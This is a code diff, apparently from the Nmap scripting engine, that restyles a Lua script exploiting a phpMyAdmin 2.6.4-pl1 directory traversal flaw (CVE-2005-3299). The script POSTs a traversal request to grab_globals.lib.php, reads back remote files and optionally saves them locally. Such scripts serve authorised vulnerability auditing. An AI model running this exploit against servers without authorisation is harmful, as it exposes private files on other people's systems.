@@ -1,10 +1,12 @@
 local shortport = require "shortport"
 local stdnse = require "stdnse"
+local string = require "string"
 local http = require "http"
+local io = require "io"
 local vulns = require "vulns"
 
 description = [[
-Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 to retrieve remote files on the web server. Other phpmyadmin versions might be vulnerable.
+Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and possibly other versions) to retrieve remote files on the web server.
 
 Reference:
 * http://www.exploit-db.com/exploits/1244/
@@ -92,50 +94,49 @@ local DEFAULT_DIR = "/phpMyAdmin-2.6.4-pl1/"
 local EXPLOIT_PATH = "libraries/grab_globals.lib.php"
 
 action = function(host, port)
-	local response, dir, file
-	dir = stdnse.get_script_args("http-phpmyadmin-dir-traversal.dir") or DEFAULT_DIR
-	evil_uri = dir..EXPLOIT_PATH
-	rfile = stdnse.get_script_args("http-phpmyadmin-dir-traversal.file") or DEFAULT_FILE
-	evil_postdata = EXPLOIT_QUERY:format(rfile)
-	filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
-	stdnse.print_debug(1, "%s: HTTP POST %s%s", SCRIPT_NAME, stdnse.get_hostname(host), evil_uri)
-	stdnse.print_debug(1, "%s: POST DATA %s", SCRIPT_NAME, evil_postdata)
+  local dir = stdnse.get_script_args("http-phpmyadmin-dir-traversal.dir") or DEFAULT_DIR
+  local evil_uri = dir..EXPLOIT_PATH
+  local rfile = stdnse.get_script_args("http-phpmyadmin-dir-traversal.file") or DEFAULT_FILE
+  local evil_postdata = EXPLOIT_QUERY:format(rfile)
+  local filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
+  stdnse.print_debug(1, "%s: HTTP POST %s%s", SCRIPT_NAME, stdnse.get_hostname(host), evil_uri)
+  stdnse.print_debug(1, "%s: POST DATA %s", SCRIPT_NAME, evil_postdata)
 
-	local vuln = {
-		title = 'phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion',
-		IDS = {CVE = 'CVE-2005-3299'},
-		state = vulns.STATE.NOT_VULN,
-		description = 
-			[[PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
-		]],
-		references = {
-			'http://www.exploit-db.com/exploits/1244/',
-		},
-		dates = {
-			disclosure = {year = '2005', month = '10', dat = '10'},
-		},
-	}
-	local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
-	
-	response = http.post(host, port, evil_uri, 
-		{header = {["Content-Type"] = "application/x-www-form-urlencoded"}}, nil, evil_postdata)
-	if response.body and response.status==200 then
-		stdnse.print_debug(1, "%s: response : %s", SCRIPT_NAME, response.body)
-		vuln.state = vulns.STATE.EXPLOIT
-		vuln.extra_info = rfile.." :\n"..response.body
-		if filewrite then
-			local status, err = write_file(filewrite,  response.body)
-			if status then
-				vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
-			else
-				vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, err)
-			end
-		end
-	elseif response.status==500 then
-		vuln.state = vulns.STATE.LIKELY_VULN
-		stdnse.print_debug(1, "%s:[Error] File not found:%s", SCRIPT_NAME, rfile)
-		stdnse.print_debug(1, "%s: response : %s", SCRIPT_NAME, response.body)
-		vuln.extra_info = string.format("%s not found.\n", rfile)
-	end
-	return vuln_report:make_output(vuln)
+  local vuln = {
+    title = 'phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion',
+    IDS = {CVE = 'CVE-2005-3299'},
+    state = vulns.STATE.NOT_VULN,
+    description =
+    [[PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
+]],
+    references = {
+      'http://www.exploit-db.com/exploits/1244/',
+    },
+    dates = {
+      disclosure = {year = '2005', month = '10', dat = '10'},
+    },
+  }
+  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
+
+  local response = http.post(host, port, evil_uri,
+    {header = {["Content-Type"] = "application/x-www-form-urlencoded"}}, nil, evil_postdata)
+  if response.body and response.status==200 then
+    stdnse.print_debug(1, "%s: response : %s", SCRIPT_NAME, response.body)
+    vuln.state = vulns.STATE.EXPLOIT
+    vuln.extra_info = rfile.." :\n"..response.body
+    if filewrite then
+      local status, err = write_file(filewrite,  response.body)
+      if status then
+        vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
+      else
+        vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, err)
+      end
+    end
+  elseif response.status==500 then
+    vuln.state = vulns.STATE.LIKELY_VULN
+    stdnse.print_debug(1, "%s:[Error] File not found:%s", SCRIPT_NAME, rfile)
+    stdnse.print_debug(1, "%s: response : %s", SCRIPT_NAME, response.body)
+    vuln.extra_info = string.format("%s not found.\n", rfile)
+  end
+  return vuln_report:make_output(vuln)
 end
